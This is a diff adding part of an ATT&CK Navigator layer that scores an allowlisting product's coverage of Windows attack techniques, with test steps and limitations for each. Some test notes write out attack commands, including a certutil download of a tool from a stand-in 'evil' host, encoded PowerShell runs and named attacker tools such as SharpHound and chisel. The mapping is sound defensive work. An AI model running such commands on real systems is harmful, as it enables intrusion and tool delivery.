+      "techniqueID": "T1059.001",
+      "score": 1,
+      "comment": "Script control blocks untrusted .ps1/.psm1/.psd1. powershell.exe blocklisted for non-admins via metarule (explicitly demonstrated in Airlock blocklist docs). PS -EncodedCommand/-Command inline not inspected. | Test: 1) Drop unsigned .ps1, invoke -> blocked. 2) Metarule: original_filename contains 'powershell' AND user NOT admin -> PS blocked for std users. 3) PS -Command 'whoami' -> runs if PS trusted. 4) PS -EncodedCommand <b64> -> runs if PS trusted. | Limitations: Inline/encoded commands in t",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1059.003",
+      "score": 1,
+      "comment": "Batch/cmd files (.bat/.cmd) enforced under script control. cmd.exe blocklist-restrictable. Child processes spawned by cmd still checked. | Test: 1) Drop .bat, execute -> blocked. 2) cmd /c dir -> runs (inline). 3) cmd /c C:\\Temp\\malware.exe -> cmd OK, malware.exe blocked. 4) Blocklist cmd for non-admins. | Limitations: Inline commands not inspected. Child process launches ARE checked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1059.005",
+      "score": 1,
+      "comment": "VBScript (.vbs/.vbe) blocked via script control. cscript/wscript/mshta blocklist-controllable. VBA macros inside Office: doc opens (Office trusted), dropped payloads blocked. | Test: 1) .vbs double-click -> blocked. 2) Blocklist wscript/cscript entirely. 3) Macro drops exe -> exe blocked. | Limitations: VBA macro code inside trusted Office not inspected.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1059.006",
+      "score": 1,
+      "comment": "python.exe must be allowlisted. .py files enforced via script control. .pyd as DLL control. Most endpoints don't need Python. | Test: 1) python.exe not allowlisted -> blocked. 2) Trusted python.exe, untrusted .py -> blocked. 3) python -c 'print(1)' -> runs if trusted (inline). | Limitations: Interactive REPL/inline not inspected.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1059.007",
+      "score": 1,
+      "comment": "JS files (.js/.jse) via WSH blocked by script control. node.exe must be allowlisted. mshta.exe blocklist-controllable. Browser JS not in scope. | Test: 1) .js double-click -> blocked. 2) Blocklist mshta.exe. 3) node.exe not allowlisted -> blocked. | Limitations: Browser JS runs inside trusted browser process.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1059.010",
+      "score": 1,
+      "comment": "AutoHotKey/AutoIT interpreters must be allowlisted (typically not in enterprise). Compiled AHK/AutoIT .exe caught by default-deny. | Test: 1) AutoIt3.exe not allowlisted -> blocked. 2) Compiled AutoIT dropper -> blocked. | Limitations: If interpreter is allowlisted, scripts need coverage.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1059.011",
+      "score": 1,
+      "comment": "lua.exe/luajit must be allowlisted. Not present in typical enterprise. Embedded Lua in trusted apps not in scope. | Test: lua.exe dropped -> blocked (not in allowlist). | Limitations: Embedded Lua in trusted processes runs in-process.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1068",
+      "score": 0,
+      "comment": "Exploitation for privilege escalation is about abusing a vulnerability in software or the kernel to gain elevated privileges. The exploit runs inside a trusted process or at kernel level. Airlock doesn't detect or prevent exploits. Post-exploitation payload deployment is covered under execution techniques. | Limitations: Exploit prevention (Windows Exploit Guard), patching, least privilege, and EDR behavioral detection are the controls.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1069",
+      "score": 1,
+      "comment": "Permission group discovery is achievable with built-in tools (net group, net localgroup) that cannot be practically blocklisted. However, standalone enumeration tools (SharpHound, AdFind, BloodHound) are blocked by default-deny. | Test: Drop SharpHound.exe or AdFind.exe -> blocked (untrusted). | Limitations: Built-in net.exe and PowerShell AD cmdlets achieve the same discovery.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1069.001",
+      "score": 0,
+      "comment": "Local group discovery via net localgroup. Same net.exe impracticality. PowerShell Get-LocalGroupMember available. | Limitations: net.exe cannot be practically blocklisted without breaking standard user operations (drive mapping, printers).",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1069.002",
+      "score": 1,
+      "comment": "Domain group discovery is achievable with built-in tools (net group /domain) that cannot be practically blocklisted. However, standalone domain enumeration tools (SharpHound, AdFind) are blocked by default-deny. | Test: SharpHound.exe / AdFind.exe -> blocked (untrusted). | Limitations: Built-in net.exe and PowerShell Get-ADGroupMember achieve the same discovery.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1070",
+      "score": 0,
+      "comment": "Indicator removal (parent). Deleting logs, files, etc. Data operations using trusted tools.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1070.001",
+      "score": 1,
+      "comment": "wevtutil.exe: restrict via blocklist metarule for non-admins. Prevents attacker from clearing event logs to cover tracks. | Test: Metarule: original_filename 'wevtutil' AND user NOT admin -> blocks log clearing. | Limitations: Admin-exempted users can still clear logs. Also clearable via PS (Clear-EventLog) if PS is trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1070.003",
+      "score": 0,
+      "comment": "Clear command history. Data operation in trusted process.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1070.004",
+      "score": 0,
+      "comment": "File deletion. del/rm via trusted shell. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1070.005",
+      "score": 0,
+      "comment": "Network share connection removal via net use /delete. net.exe cannot be practically blocklisted. Minor technique. | Limitations: net.exe cannot be practically blocklisted without breaking standard user operations (drive mapping, printers).",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1070.006",
+      "score": 0,
+      "comment": "Timestomp. Modifying file timestamps. Data operation. | Limitations: Airlock hashes file content, not timestamps.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1070.007",
+      "score": 0,
+      "comment": "Clear network connection history. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1070.008",
+      "score": 0,
+      "comment": "Clear mailbox data. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1070.009",
+      "score": 0,
+      "comment": "Clear persistence. Removing previously set persistence. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1070.010",
+      "score": 0,
+      "comment": "Relocating malware to a different directory. File still has untrusted hash -> blocked regardless of location. | Test: Relocated malware still blocked by hash check. | Limitations: Actually covered by default-deny (hash doesn't change with location) but the technique itself is about evasion, and Airlock doesn't prevent file movement.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1071",
+      "score": 0,
+      "comment": "Application layer protocol. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1071.001",
+      "score": 0,
+      "comment": "Web protocols. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1071.002",
+      "score": 0,
+      "comment": "File transfer protocols. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1071.003",
+      "score": 0,
+      "comment": "Mail protocols. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1071.004",
+      "score": 0,
+      "comment": "DNS. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1071.005",
+      "score": 0,
+      "comment": "Publish/subscribe protocols. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1072",
+      "score": 1,
+      "comment": "Deployment tools (SCCM, PDQ) are trusted. If compromised to push malicious payloads, payload must still pass default-deny on target endpoint. Untrusted binary blocked at execution regardless of delivery method. | Test: Push unsigned exe via SCCM to endpoint -> deployed successfully, blocked at execution. | Limitations: If deployment tool configured as trusted parent process, audit process trust rules carefully. Payloads signed by trusted publisher pass publisher trust.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1074",
+      "score": 0,
+      "comment": "Data staged. Collecting data to staging location. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1074.001",
+      "score": 0,
+      "comment": "Local data staging. Same.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1074.002",
+      "score": 0,
+      "comment": "Remote data staging. Same.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1078",
+      "score": 0,
+      "comment": "Valid accounts. Using legitimate credentials. Identity plane. No file execution. | Limitations: Post-access, Airlock enforces on tools attacker runs with valid creds.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1078.001",
+      "score": 0,
+      "comment": "Default accounts. Identity.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1078.002",
+      "score": 0,
+      "comment": "Domain accounts. Identity.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1078.003",
+      "score": 0,
+      "comment": "Local accounts. Identity.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1080",
+      "score": 1,
+      "comment": "Taint shared content. Placing malicious files on network shares. When victim executes file, Airlock blocks untrusted payload. | Test: Malicious exe on share -> victim double-clicks -> blocked. | Limitations: File placement not prevented. Execution on victim blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1082",
+      "score": 1,
+      "comment": "systeminfo.exe restrictable via blocklist metarule for non-admins. | Test: Blocklist systeminfo.exe for non-admins. | Limitations: WMI queries (via trusted wmic or PS) can retrieve same info if not blocklisted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1083",
+      "score": 0,
+      "comment": "File and directory discovery. dir, Get-ChildItem. Trusted.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1087",
+      "score": 1,
+      "comment": "Account discovery is achievable with built-in tools (net user) that cannot be practically blocklisted. However, standalone enumeration tools (SharpHound, AdFind, BloodHound) are blocked by default-deny. | Test: SharpHound.exe / AdFind.exe -> blocked (untrusted). | Limitations: Built-in net.exe and PowerShell Get-LocalUser/Get-ADUser achieve the same discovery.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1087.001",
+      "score": 0,
+      "comment": "Local account discovery via net user. Same net.exe impracticality. | Limitations: net.exe cannot be practically blocklisted without breaking standard user operations (drive mapping, printers).",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1087.002",
+      "score": 1,
+      "comment": "Domain account discovery is achievable with built-in tools (net user /domain) that cannot be practically blocklisted. However, standalone domain enumeration tools (SharpHound, AdFind) are blocked by default-deny. | Test: SharpHound.exe / AdFind.exe -> blocked (untrusted). | Limitations: Built-in net.exe and PowerShell Get-ADUser achieve the same discovery.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1087.003",
+      "score": 0,
+      "comment": "Email account discovery. Trusted tools/APIs.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1090",
+      "score": 0,
+      "comment": "Proxy. Network infrastructure.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1090.001",
+      "score": 1,
+      "comment": "Internal proxy tools (chisel, socat, netsh portproxy) \u2014 standalone tools blocked. netsh restrictable via blocklist metarule. | Test: 1) chisel/socat -> blocked (untrusted). 2) Blocklist netsh for non-admins. | Limitations: netsh portproxy is the built-in risk. Blocklist addresses it.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1090.002",
+      "score": 0,
+      "comment": "External proxy. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1090.003",
+      "score": 0,
+      "comment": "Multi-hop proxy. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1090.004",
+      "score": 0,
+      "comment": "Domain fronting. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1091",
+      "score": 1,
+      "comment": "Replication through removable media. Malware on USB must be trusted to execute. Autorun payloads blocked. | Test: Insert USB with unsigned exe, attempt to run -> blocked. Autorun pointing to untrusted payload -> blocked. | Limitations: USB device insertion not prevented. Only execution of untrusted files.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1092",
+      "score": 0,
+      "comment": "Communication through removable media. Data on USB for C2. No execution required. | Limitations: If C2 agent on USB is untrusted, blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1095",
+      "score": 0,
+      "comment": "Non-application layer protocol. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1098",
+      "score": 0,
+      "comment": "Account manipulation. Identity-plane operation. No file execution. | Limitations: Identity/directory security.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1098.002",
+      "score": 0,
+      "comment": "Additional email delegate permissions. No file execution.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1098.005",
+      "score": 0,
+      "comment": "Device registration. MDM/identity plane.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1098.007",
+      "score": 0,
+      "comment": "Adding users to groups is an identity operation. net.exe is used by standard users for drive mapping and other legitimate operations - blocklisting it causes operational issues. PowerShell AD cmdlets and direct LDAP/API calls can perform the same operation. | Limitations: net.exe cannot be practically blocklisted without breaking standard user operations (drive mapping, printers).",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1102",
+      "score": 0,
+      "comment": "Web service. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1102.001",
+      "score": 0,
+      "comment": "Dead drop resolver. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1102.002",
+      "score": 0,
+      "comment": "Bidirectional communication. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1102.003",
+      "score": 0,
+      "comment": "One-way communication. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1104",
+      "score": 0,
+      "comment": "Multi-stage channels. Network. | Limitations: If staged payload is file, must be trusted.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1105",
+      "score": 1,
+      "comment": "Ingress tool transfer \u2014 downloaded tools must be trusted to execute. Download succeeds but execution blocked. Download utilities (certutil, bitsadmin, curl) can be blocklisted. | Test: 1) certutil -urlcache -split -f http://evil/tool.exe C:\\Temp\\t.exe -> downloads, execution blocked. 2) Blocklist certutil/bitsadmin for non-admins. | Limitations: Download not prevented. Execution is the control point.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1106",
+      "score": 0,
+      "comment": "Native API calls (NtCreateProcess, VirtualAllocEx, CreateRemoteThread) operate inside trusted processes. Airlock doesn't hook APIs. If API call loads new DLL/exe, that IS checked. | Test: N/A - API-level behavior inside trusted processes. | Limitations: By design. EDR territory.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1110",
+      "score": 0,
+      "comment": "Brute force. Network-based credential attacks. No file execution on target. | Limitations: If brute force tool is untrusted, tool blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1110.001",
+      "score": 0,
+      "comment": "Password guessing. Network-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1110.002",
+      "score": 1,
+      "comment": "Password cracking tools (hashcat, john) must be trusted. Blocked by default-deny. | Test: hashcat.exe, john.exe not allowlisted -> blocked. | Limitations: Typically offline attack. Tools must be on the endpoint to be relevant.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1110.003",
+      "score": 0,
+      "comment": "Password spraying. Network-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1110.004",
+      "score": 0,
+      "comment": "Credential stuffing. Network-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1111",
+      "score": 0,
+      "comment": "MFA interception. Identity/protocol level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1112",
+      "score": 0,
+      "comment": "Registry modification is a data operation. Airlock doesn't monitor registry writes. reg.exe and regedit.exe are used by installers, Group Policy processing, and Windows Update - blocklisting them is impractical without breaking system operations. PowerShell, WMI, and direct registry APIs from any trusted process can modify the registry. Many persistence techniques USE registry for setup, but Airlock catches the PAYLOAD those registry entries point to, not the registry modification itself. | Limi",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1113",
+      "score": 0,
+      "comment": "Standalone screenshot tool blocked. Built-in Snipping Tool/PowerShell trusted. | Test: Untrusted tool -> blocked. | Limitations: Built-in tools succeed.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1114",
+      "score": 0,
+      "comment": "Email collection. Reading emails. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1114.001",
+      "score": 0,
+      "comment": "Local email collection. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1114.002",
+      "score": 0,
+      "comment": "Remote email collection. Network/API operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1114.003",
+      "score": 0,
+      "comment": "Email forwarding rule. Config operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1115",
+      "score": 0,
+      "comment": "Clipboard data. API-based access from trusted process.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1119",
+      "score": 0,
+      "comment": "Automated collection scripts must be trusted. But technique achievable with trusted PowerShell scripts. | Test: Untrusted collection script -> blocked. | Limitations: Trusted PS scripts succeed.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1120",
+      "score": 0,
+      "comment": "Peripheral device discovery. Trusted tools/APIs.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1123",
+      "score": 0,
+      "comment": "Standalone audio capture tool blocked. Trusted tools/APIs succeed. | Test: Untrusted tool -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1124",
+      "score": 0,
+      "comment": "System time discovery. w32tm, time. Trusted.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1125",
+      "score": 0,
+      "comment": "Standalone video capture tool blocked. Trusted tools/APIs succeed. | Test: Untrusted tool -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1127",
+      "score": 1,
+      "comment": "Trusted developer utilities proxy execution (parent). Tools like MSBuild used to execute code. These LOLBINs can be blocklisted. Payloads they load must be trusted. | Test: Blocklist MSBuild, InstallUtil, etc. Payload DLLs loaded by these tools must be trusted. | Limitations: Core LOLBIN defense. Blocklist + DLL control is strong.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1127.001",
+      "score": 1,
+      "comment": "MSBuild. Can compile and execute code from XML project files. MSBuild.exe can be blocklisted. Output binaries/DLLs must be trusted. | Test: 1) Blocklist msbuild.exe for non-developers. 2) MSBuild output exe -> blocked (untrusted). 3) MSBuild loading untrusted DLL -> blocked. | Limitations: If MSBuild is allowlisted, it can compile code. Blocklist is key.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1127.002",
+      "score": 1,
+      "comment": "ClickOnce. Application deployment via .application files. Downloaded assemblies must be trusted. | Test: ClickOnce deploying untrusted assembly -> blocked. | Limitations: ClickOnce deployment mechanism itself uses trusted dfsvc.exe.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1127.003",
+      "score": 1,
+      "comment": "JamPlus. Build tool. Can execute arbitrary code. Must be allowlisted to run. | Test: JamPlus not allowlisted -> blocked. | Limitations: Niche tool. Unlikely to be in enterprise allowlist.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1129",
+      "score": 1,
+      "comment": "Airlock allowlists DLLs by default. Every DLL load SHA-256 hashed and checked. Prevents DLL sideloading. | Test: 1) Place unsigned DLL in trusted app directory (sideload) -> blocked. 2) LoadLibrary('C:\\Temp\\evil.dll') -> blocked. | Limitations: Reflective DLL injection (memory-only, never a file) not caught.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1132",
+      "score": 0,
+      "comment": "Data encoding. Network-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1132.001",
+      "score": 0,
+      "comment": "Standard encoding. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1132.002",
+      "score": 0,
+      "comment": "Non-standard encoding. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1133",
+      "score": 0,
+      "comment": "External remote services (VPN/RDP/Citrix). Access mechanism. Post-access, Airlock enforces on any tools attacker tries to run. | Test: RDP in, attempt unsigned tool -> blocked. | Limitations: Access itself not prevented.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1134",
+      "score": 0,
+      "comment": "Access token manipulation. API-level operations inside trusted process. No file execution. | Limitations: If tool for token manipulation is untrusted, tool itself blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1134.001",
+      "score": 0,
+      "comment": "Token impersonation/theft. API-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1134.002",
+      "score": 0,
+      "comment": "Process created with stolen token \u2014 the process binary must be trusted, but token manipulation itself is API-level and not caught. | Limitations: Token manipulation is identity/API level. EDR territory.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1134.003",
+      "score": 0,
+      "comment": "Make and impersonate token. API-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1134.004",
+      "score": 0,
+      "comment": "Parent PID spoofing is API-level process creation. Binary must be trusted but spoofing is not detected. | Limitations: May affect Airlock process trust rules that key on parent process. Test.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1134.005",
+      "score": 0,
+      "comment": "SID-History injection. Identity/AD manipulation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1135",
+      "score": 1,
+      "comment": "Network share discovery is achievable with built-in tools (net share, net view) that cannot be practically blocklisted. However, standalone share enumeration tools (ShareFinder, SoftPerfect Network Scanner, PowerView as compiled exe) are blocked by default-deny. | Test: ShareFinder.exe / SoftPerfect scanner -> blocked (untrusted). | Limitations: Built-in net.exe and PowerShell Get-SmbShare achieve the same discovery.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1136",
+      "score": 0,
+      "comment": "Account creation via net user /add. Identity operation. net.exe cannot be practically blocklisted. PowerShell New-LocalUser/New-ADUser available. | Limitations: net.exe cannot be practically blocklisted without breaking standard user operations (drive mapping, printers).",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1136.001",
+      "score": 0,
+      "comment": "Local account creation via net user /add. Same as parent. | Limitations: net.exe cannot be practically blocklisted without breaking standard user operations (drive mapping, printers).",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1136.002",
+      "score": 0,
+      "comment": "Domain account. Identity operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1137",
+      "score": 1,
+      "comment": "Office application startup. Malicious add-ins (DLLs) must be trusted. Template macros: doc opens, payload blocked. | Test: 1) Untrusted Office add-in DLL -> blocked at Office startup. 2) Malicious .dotm macro drops exe -> exe blocked. | Limitations: Macro code inside trusted Office not inspected.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1137.001",
+      "score": 1,
+      "comment": "Office template macros. Template loads in trusted Office. Macro code runs. Dropped payloads blocked. | Test: Malicious .dotm macro drops exe -> exe blocked. | Limitations: Macro code itself runs inside Office.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1137.002",
+      "score": 1,
+      "comment": "Office Test reg key loads DLL into Office. DLL must be trusted. | Test: Set Office Test reg key to unsigned DLL -> DLL blocked at Office launch. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1137.003",
+      "score": 1,
+      "comment": "Outlook forms loading DLLs \u2014 DLL must be trusted. | Test: Outlook form loading untrusted DLL -> blocked. | Limitations: VBScript running inside trusted Outlook form context may execute. Dropped payloads blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1137.004",
+      "score": 1,
+      "comment": "Outlook home page triggering external process execution \u2014 process must be trusted. | Test: Outlook home page launching untrusted exe -> blocked. | Limitations: HTML/script running inside Outlook's embedded browser context may not be caught.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1137.005",
+      "score": 1,
+      "comment": "Outlook rules can run applications. Application must be trusted. | Test: Outlook rule to run C:\\Temp\\payload.exe -> blocked. | Limitations: Rule creation not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1137.006",
+      "score": 1,
+      "comment": "Office add-ins (.dll/.xll). Must be trusted by hash/publisher. | Test: Untrusted .xll in add-in dir -> blocked by Excel. | Limitations: Signed add-ins from trusted publishers load normally.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1140",
+      "score": 1,
+      "comment": "Decoded/deobfuscated payload must be trusted to execute. certutil.exe (commonly used for decoding) can be blocklisted. | Test: 1) certutil -decode output.exe -> output.exe blocked. 2) Blocklist certutil for non-admins. | Limitations: Decoding itself not prevented if tool is trusted. Decoded file execution IS blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1176",
+      "score": 1,
+      "comment": "Browser extensions. Dedicated browser extension control feature. Untrusted extensions blocked from installation on Chrome/Edge/Firefox. Extension updates monitored. | Test: 1) Enable browser ext control in enforcement. 2) Install untrusted extension -> fails. 3) Untrusted extension update -> browser uninstalls it. | Limitations: Only controls extension installation, not JS within trusted extensions.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1176.001",
+      "score": 1,
+      "comment": "Browser extensions specifically. Same as parent. | Test: Same as T1176. | Limitations: Same.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1176.002",
+      "score": 1,
+      "comment": "IDE must be allowlisted. IDE extension DLLs/native modules must be trusted. | Test: Untrusted VS Code extension native module -> blocked at load. | Limitations: JS-based extensions run inside trusted IDE process \u2014 not separately controlled.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1185",
+      "score": 0,
+      "comment": "Browser session hijacking. In-browser or extension-based. Malicious extension install blocked by browser extension control, but technique achievable via trusted extensions or in-page JS. | Test: Malicious extension -> install blocked. | Limitations: In-browser techniques not caught.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1187",
+      "score": 0,
+      "comment": "Forced authentication. Triggering NTLM auth via UNC paths. No file execution.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1189",
+      "score": 1,
+      "comment": "Drive-by compromise \u2014 browser exploit in trusted browser. Any payload dropped to disk (exe/DLL/script) must be trusted. | Test: Drive-by drops exe -> blocked. Drive-by drops DLL -> blocked. | Limitations: In-browser exploitation executing entirely in memory not caught.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1190",
+      "score": 0,
+      "comment": "Exploiting a public-facing application is a network/application security problem. Airlock doesn't prevent exploits. WAF, patching, network segmentation are the controls. Post-exploitation payload execution on the host is covered under execution techniques. | Limitations: Web application firewalls, patching, and network segmentation are the primary controls.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
